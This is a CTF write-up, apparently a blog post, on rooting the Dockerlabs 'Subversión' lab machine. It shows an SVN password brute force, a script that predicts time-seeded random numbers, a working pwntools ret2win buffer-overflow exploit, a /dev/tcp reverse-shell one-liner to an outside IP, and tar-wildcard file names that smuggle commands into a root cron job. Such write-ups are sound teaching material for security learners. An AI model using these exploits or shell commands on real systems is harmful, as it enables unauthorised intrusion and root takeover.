---
author: Lenam
pubDatetime: 2025-02-01T15:22:00Z
title: WriteUp Subversión - Dockerlabs
slug: subversion-writeup-dockerlabs-en
featured: false
draft: false
ogImage: "assets/subversion/OpenGraph.png"
tags:
  - writeup
  - dockerlabs
  - buffer-overflow
  - tar-wildcards
  - insecure-random
description:
  "This lab, available on the Dockerlabs platform, covers multiple security challenges: from brute-forcing Subversion and guessing an insecure random number to exploiting a buffer overflow and escalating privileges using the tar wildcard technique."
lang: en
---


![Alt text](/assets/subversion/OpenGraph.png)

This lab, available on the Dockerlabs platform, covers multiple security challenges: from brute-forcing Subversion and guessing an insecure random number to exploiting a buffer overflow and escalating privileges using the tar wildcard technique.

## Table of Contents  

## Enumeration  

### Nmap

```bash
$ nmap -p- -Pn -n -T4 -oN allPorts 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 01:39 CET
Nmap scan report for 172.17.0.2
Host is up (0.0000070s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
1789/tcp open  hello
3690/tcp open  svn
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds
```


```bash
$ nmap -p80,1789,3690 -sVC -Pn -T4 -oN info_ports 172.17.0.2 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 01:39 CET
Nmap scan report for 172.17.0.2
Host is up (0.000021s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Subversi\xC3\xB3n
|_http-server-header: nginx/1.18.0 (Ubuntu)
1789/tcp open  landesk-rc LANDesk remote management
3690/tcp open  svnserve   Subversion
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds

```

### Port 80 (HTTP)

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://172.17.0.2 -x js,php,bd,zip,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,php,bd,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/upload               (Status: 200) [Size: 163]
Progress: 149609 / 1323360 (11.31%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 154847 / 1323360 (11.70%)
===============================================================
Finished
===============================================================
```

On the port 80 route, we can see in the browser:  

![Alt text](/assets/subversion/image.png)  

The `/upload` path is a text file with the following content:  

```bash
$ curl http://172.17.0.2/upload                                        
¡Por aquí no es! ¿No viste al conejo? Iba con un mosquete y una boina revolucionaria...  
Pero con svnuser quizá puedas hacer algo en el repositorio subversion.  
```

It is quite clear that this is a `rabbit hole`, but we have obtained a username `svnuser` and a repository name `subversion`.  

### Port 1789  

It appears to be a custom application that asks questions about historical "Subversions."  
If you answer all the questions correctly, it finally asks for a random number:

```bash
$ nc 172.17.0.2 1789
Bienvenido a subversion!
Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?
Respuesta: 1789
Pregunta 2: ¿Cuál fue el nombre del movimiento liderado por Mahatma Gandhi en la India?
Respuesta: no violencia
Pregunta 3: ¿Qué evento histórico tuvo lugar en Berlín en 1989?
Respuesta: caida del muro
Pregunta 4: ¿Cómo se llama el documento firmado en 1215 que limitó los poderes del rey de Inglaterra?
Respuesta: carta magna
Pregunta 5: ¿Cuál fue el levantamiento liderado por Nelson Mandela contra el apartheid?
Respuesta: lucha contra el apartheid 
Pregunta extra: Adivina el número secreto para continuar (entre 0 y 9999999):
Respuesta: 11
Respuesta incorrecta. No puedes continuar.
```

We attempted a buffer overflow, but it does not "seem" to be vulnerable.  

### Port 3690 (SVN)  

```bash
$ nc -vn 172.17.0.2 3690                                    
(UNKNOWN) [172.17.0.2] 3690 (svn) open
( success ( 2 2 ( ) ( edit-pipeline svndiff1 accepts-svndiff2 absent-entries commit-revprops depth log-revprops atomic-revprops partial-replay inherited-props ephemeral-txnprops file-revs-reverse list ) ) )

$ svn ls svn://172.17.0.2
svn: E170013: Unable to connect to a repository at URL 'svn://172.17.0.2'
svn: E210005: No repository found in 'svn://172.17.0.2'

$ svn ls svn://172.17.0.2/subversion
Reino de autentificación: <svn://172.17.0.2:3690> 50f8afbc-4def-4427-9391-50d90a83567b
Clave de 'kali':
```

We discovered a repository, but it is private. We try using the username we found in `/upload`.  

We attempt to log in with a different user, `test`, and with `svnuser`.  

![Alt text](/assets/subversion/image-1.png)  

We can see that the user `svnuser` appears to belong to this service, although we already suspected it from the name.  

## SVN Brute Force  

Nmap has a script to perform brute force attacks on SVN services.  

https://nmap.org/nsedoc/scripts/svn-brute.html  

We create a list of users and passwords in the format required by the script from `rockyou.txt` using `sed`.

```bash
$ sed 's/^/svnuser\//' /usr/share/wordlists/rockyou.txt > svnuser_rockyou.txt

$ head svnuser_rockyou.txt                             
svnuser/123456
svnuser/12345
svnuser/123456789
svnuser/password
svnuser/iloveyou
svnuser/princess
svnuser/1234567
svnuser/rockyou
svnuser/12345678
svnuser/abc123
```
We run `nmap` with our credential list and find the credentials for the user `svnuser`.  

```bash
$ nmap --script svn-brute --script-args svn-brute.repo=/subversion/,brute.credfile=./svnuser_rockyou.txt -p 3690 172.17.0.2 --min-rate 5000 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 18:42 CET
Nmap scan report for 172.17.0.2
Host is up (0.000014s latency).

PORT     STATE SERVICE
3690/tcp open  svn
| svn-brute: 
|   Accounts: 
|     svnuser:iloveyou! - Valid credentials
|_  Statistics: Performed 995 guesses in 46 seconds, average tps: 21.8

Nmap done: 1 IP address (1 host up) scanned in 49.63 seconds
```

## SVN Repository  

Now we can list and download the repository.  

```bash
$ svn ls svn://172.17.0.2/subversion --username=svnuser --password=iloveyou!
subversion
subversion.c
```

There are two files: a binary and what appears to be its C source code. We clone the SVN repository.  

```bash
$ svn checkout svn://172.17.0.2/subversion --username=svnuser --password=iloveyou! subversion_report
A    subversion_report/subversion
A    subversion_report/subversion.c
Revisión obtenida: 1
$ cd subversion_report/
$ ls -a
.  ..  subversion  subversion.c  .svn
```

We find a binary `subversion`, which is the same program we found on port 1789.  

```
$ ./subversion 
Bienvenido a subversion!
Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?
Respuesta: 1789
Pregunta 2: ¿Cuál fue el nombre del movimiento liderado por Mahatma Gandhi en la India?
Respuesta: test
Respuesta incorrecta. No puedes continuar.
```

And the file `subversion.c`, which appears to be the program's source code.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>

void ask_questions();
void magic_text();
void normalize_input(char *str);

int main() {
    // Desactiva el buffering en stdout
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Bienvenido a subversion!\n");
    ask_questions();
    return 0;
}

void ask_questions() {
    char answer[256];
    int random_number;
    char number_str[5];

    // Semilla para el generador de números aleatorios basada en un XOR del tiempo y el numero 69
    srand(time(NULL) ^ 69);

    // Generar un número aleatorio entre 0 y 9999999
    random_number = rand() % 10000000;

    // Pregunta 1
    printf("Pregunta 1: ¿En qué año ocurrió la Revolución Francesa?\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);
    if (strcmp(answer, "1789") != 0) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    // Pregunta 2
    printf("Pregunta 2: ¿Cuál fue el nombre del movimiento liderado por Mahatma Gandhi en la India?\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);
    if (strcmp(answer, "satyagraha") != 0 && strcmp(answer, "noviolencia") != 0) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    // Pregunta 3
    printf("Pregunta 3: ¿Qué evento histórico tuvo lugar en Berlín en 1989?\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);
    if (strcmp(answer, "caidadelmurodeberlin") != 0 && strcmp(answer, "caidadelmuro") != 0) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    // Pregunta 4
    printf("Pregunta 4: ¿Cómo se llama el documento firmado en 1215 que limitó los poderes del rey de Inglaterra?\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);
    if (strcmp(answer, "cartamagna") != 0) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    // Pregunta 5
    printf("Pregunta 5: ¿Cuál fue el levantamiento liderado por Nelson Mandela contra el apartheid?\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);
    if (strcmp(answer, "luchacontraelapartheid") != 0 && strcmp(answer, "movimientoantiapartheid") != 0) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    // Pregunta aleatoria
    printf("Pregunta extra: Adivina el número secreto para continuar (entre 0 y 9999999):\n");
    printf("Respuesta: ");
    fgets(answer, sizeof(answer), stdin);
    normalize_input(answer);

    // Convertir la respuesta del usuario a entero
    int user_guess = atoi(answer);

    if (user_guess != random_number) {
        printf("Respuesta incorrecta. No puedes continuar.\n");
        return;
    }

    printf("¡Felicitaciones! Has adivinado el número secreto.\n");
    magic_text();
}

void magic_text() {
    char buffer[64];
    printf("Introduce tu \"mágico\" texto para continuar: ");
    gets(buffer); 
    printf("Has introducido: %s\n", buffer);
}


void normalize_input(char *str) {
    char *src = str;
    char *dst = str;
    while (*src) {
        if (*src == '\n' || *src == '\r') {
            src++;
            continue;
        }
        if (isspace((unsigned char)*src)) {
            src++;
            continue;
        }
        // Convertir a minúsculas y eliminar acentos
        unsigned char c = (unsigned char)*src;
        if (c >= 'A' && c <= 'Z') {
            c = c + ('a' - 'A');
        }
        // Eliminar caracteres especiales (acentos)
        if (c == 0xE1 || c == 0xC1) c = 'a';
        else if (c == 0xE9 || c == 0xC9) c = 'e';
        else if (c == 0xED || c == 0xCD) c = 'i';
        else if (c == 0xF3 || c == 0xD3) c = 'o';
        else if (c == 0xFA || c == 0xDA) c = 'u';
        else if (c == 0xF1 || c == 0xD1) c = 'n';

        *dst++ = c;
        src++;
    }
    *dst = '\0';
}

void shell() {
    system("/bin/bash");
}
```

Important things we observe in the code:  

1. The random number to guess is not secure; the seed is based on time and is generated at the start of the program.  

```c
    // Seed for the random number generator based on an XOR of the time and the number 69
    srand(time(NULL) ^ 69);

    // Generate a random number between 0 and 9999999
    random_number = rand() % 10000000;
```

2. The last question in the function `magic_text`, which is called after guessing the random number, appears to be vulnerable to buffer overflow. We will verify this later.  

```c
void magic_text() {
    char buffer[64];
    printf("Introduce tu \"mágico\" texto para continuar: ");
    gets(buffer); 
    printf("Has introducido: %s\n", buffer);
}
```

3. There is a function in the code that is never used, `shell()`, which also executes a shell in `bash`.

```c
void shell() {
    system("/bin/bash");
}
```

## Intrusion  

### Guessing the Random Number  

To guess the random number, we first need to determine which version of the `libc` library is being used to generate it.  

```bash
$ ldd subversion
        linux-vdso.so.1 (0x00007fa3e2c8e000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa3e2a74000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fa3e2c90000)
```

It dynamically loads the `libc.so.6` library, but since it is running in a Docker container, it ultimately loads the same library from the host system.  

The random number seed is generated using the number of seconds elapsed since the Unix epoch `time()` (epoch), which is the number of seconds since January 1, 1970 (UTC). This number is XORed with 69, and the result is used as the seed for generating the random number.

```c
    // Semilla para el generador de números aleatorios basada en un XOR del tiempo y el numero 69
    srand(time(NULL) ^ 69);

    // Generar un número aleatorio entre 0 y 9999999
    random_number = rand() % 10000000;
```

If we manage to use the same library to generate the random number and input the same seed at the exact same second, we will be able to guess the random number.  

We prepare a Python script to automate everything, correctly answer the questions, and guess the random number.

```python
from pwn import *
import ctypes
from datetime import datetime, timezone

binario = './subversion'
p = process(binario)

# Cargar la biblioteca estándar de C
libc = ctypes.CDLL('libc.so.6')

# Funciones para usar rand y srand de C
def c_srand(seed):
    libc.srand(seed)

def c_rand():
    return libc.rand()

# Generar el número aleatorio con la semilla ajustada
current_time = int(datetime.now(timezone.utc).timestamp())
seed = current_time ^ 69
c_srand(seed)
random_number = c_rand() % 10000000

def responde():
    # Lista de respuestas
    respuestas = [
        b"1789",
        b"No violencia",
        b"Caida del Muro",
        b"Carta Magna",
        b"Lucha contra el apartheid"
    ]
    # Recorremos la lista de respuestas
    for resp in respuestas:
        # Esperamos hasta recibir "Respuesta:"
        p.recvuntil(b"Respuesta:")
        # Enviamos la respuesta
        p.sendline(resp)

# Enviamos número aleatorio
def aleatorio():
    p.recvuntil(b"Respuesta:")
    p.sendline(bytes(str(random_number), 'ascii'))

if __name__ == '__main__':
    responde()
    aleatorio()
    p.interactive()
```

We manage to guess the random number and enter the `magic_text()` function, where we find a buffer overflow.  

![alt text](/assets/subversion/aleatorio-ok.png)  

### Buffer Overflow  

Since our method worked, we assume the binary is also vulnerable to a buffer overflow. We check its security using `checksec.sh` (https://www.trapkit.de/tools/checksec/checksec.sh).  

```bash
$ checksec --file ./subversion
[*] '/home/kali/CTFs/dockerlabs/subversion/exploit/subversion'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

The binary has no **NX** protection, **STACK CANARY** is not enabled, and **PIE** is also disabled. Based on the `strings` command and the fact that it is in the same repository as the server, we assume it is the same C program.  

```bash
$ file subversion 
subversion: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=97afd68e56c74ef54022ce3c413dcff8fe8bac2f, for GNU/Linux 3.2.0, not stripped
```

Additionally, we see that the file is a **64-bit executable**.  

Since we are using a **Docker container**, it inherits the **ASLR** security from the host. We check our Kali system’s security settings and disable ASLR.  

```bash
$ cat /proc/sys/kernel/randomize_va_space
2
```

According to `/proc/sys/kernel/randomize_va_space`:
- **0** means ASLR is disabled.
- **1** means partial ASLR.
- **2** means full ASLR (default in most distributions).

We disable it:  

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

And confirm that it is disabled:  

```bash
$ cat /proc/sys/kernel/randomize_va_space
0
```

We will attempt a **ret2win** by calling the "ghost" function `shell()`. To do this, we need its memory address, which we retrieve using `gdb`.  

```bash
$ gdb -q subversion
```

![alt text](/assets/subversion/gdb-shell.png)  

We obtain the `rdi` register address just before calling `system` and take note of it.  

```bash
0x00000000004017b4 <+8>:     lea    0xba0(%rip),%rdi        # 0x40235b
```

Now, we need to determine the **offset** we need to fill in to trigger the buffer overflow and insert the address of the `rdi` register that we are interested in.  

As seen in the source code, the user’s input is stored in the variable `char buffer[64];`. Typically, each `char` is stored in a single byte, making it **64 bytes**, but since we are in a **64-bit system**, we add an extra **8 bytes**.  

We add another function to our exploit to try calling the `shell()` function and obtain a **bash shell**.

```python
from pwn import *
import ctypes
from datetime import datetime, timezone

binario = './subversion'
p = process(binario)

# Cargar la biblioteca estándar de C
libc = ctypes.CDLL('libc.so.6')

# Funciones para usar rand y srand de C
def c_srand(seed):
    libc.srand(seed)

def c_rand():
    return libc.rand()

# Generar el número aleatorio con la semilla ajustada
current_time = int(datetime.now(timezone.utc).timestamp())
seed = current_time ^ 69
c_srand(seed)
random_number = c_rand() % 10000000

def responde():
    # Lista de respuestas
    respuestas = [
        b"1789",
        b"No violencia",
        b"Caida del Muro",
        b"Carta Magna",
        b"Lucha contra el apartheid"
    ]
    # Recorremos la lista de respuestas
    for resp in respuestas:
        # Esperamos hasta recibir "Respuesta:"
        p.recvuntil(b"Respuesta:")
        # Enviamos la respuesta
        p.sendline(resp)

# Enviamos número aleatorio
def aleatorio():
    p.recvuntil(b"Respuesta:")
    p.sendline(bytes(str(random_number), 'ascii'))

def overflow():
    funcion = p64(0x00000000004017b4)
    offset = 64+8 
    buffer = b"A"*offset
    payload = buffer + funcion
    p.recvuntil("Introduce tu \"mágico\" texto para continuar:".encode('utf-8'))
    p.sendline(payload)


if __name__ == '__main__':
    responde()
    aleatorio()
    overflow()
    p.interactive()
```

We execute it and obtain a shell on our own system, working as expected.  

![alt text](/assets/subversion/exploit-1.png)  

Now, we modify the first lines of the exploit so that instead of executing the downloaded `subversion` binary, it connects to port `1789`.  

```python
binario = './subversion'
# p = process(binario)
p = remote('172.17.0.2', '1789')
```

We run the exploit again and obtain a shell as user `luigi` on the server.  

![alt text](/assets/subversion/exploit-2.png)  

## Privilege Escalation  

To work more comfortably on the server, we create another shell and set up tty handling.  

![alt text](/assets/subversion/escalada.png)  

```
/usr/bin/bash -c "/usr/bin/bash -i >& /dev/tcp/192.168.1.116/12345 0>&1"
```

We find a scheduled task that runs every minute as the root user.

```bash
luigi@22ae1bc1f511:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/backup.sh

luigi@22ae1bc1f511:/$ cat /usr/local/bin/backup.sh
#!/bin/bash
mkdir -p /backups
cd /home/luigi/
tar -czf /backups/home_luigi_backup.tar.gz *

luigi@22ae1bc1f511:/$ ls -la /usr/local/bin/backup.sh
-rwxr-xr-x 1 root root 91 Dec 27 23:11 /usr/local/bin/backup.sh
```

We do not have write permissions on the scheduled task file, but we can exploit this task using a **TAR Wildcard**, as we do have permissions in the `/home/luigi` directory.  

```bash
luigi@22ae1bc1f511:/home/luigi$ echo "cp /usr/bin/bash /tmp/b && chmod +s /tmp/b" > cpbash.sh
luigi@22ae1bc1f511:/home/luigi$ chmod +x cpbash.sh 
luigi@22ae1bc1f511:/home/luigi$ touch ./'--checkpoint=1' 
luigi@22ae1bc1f511:/home/luigi$ touch ./'--checkpoint-action=exec=sh cpbash.sh'
luigi@22ae1bc1f511:/home/luigi$ ls -la
total 32
-rw-r--r-- 1 luigi root     0 Feb  2 01:15 '--checkpoint-action=exec=sh cpbash.sh'
-rw-r--r-- 1 luigi root     0 Feb  2 01:14 '--checkpoint=1'
drwxr-xr-x 1 luigi luigi 4096 Feb  2 01:15  .
drwxr-xr-x 1 root  root  4096 Dec 27 23:11  ..
-rw-r--r-- 1 luigi luigi  220 Feb 25  2020  .bash_logout
-rw-r--r-- 1 luigi luigi 3771 Feb 25  2020  .bashrc
-rw-r--r-- 1 luigi luigi  807 Feb 25  2020  .profile
-rwxr-xr-x 1 luigi root    43 Feb  2 01:14  cpbash.sh
drwxr-xr-x 3 luigi luigi 4096 Dec 27 23:11  subversion
```

We wait for a minute and obtain a **SUID bash shell**. We use it to escalate privileges to root.  

```bash
luigi@22ae1bc1f511:/home/luigi$ ls -la /tmp/b
-rwsr-sr-x 1 root root 1183448 Feb  2 01:17 /tmp/b
luigi@22ae1bc1f511:/home/luigi$ /tmp/b -p
b-5.0# id
uid=1000(luigi) gid=0(root) euid=0(root) groups=0(root)
b-5.0# 
```

**Lab completed, I hope you enjoyed it or learned something.**
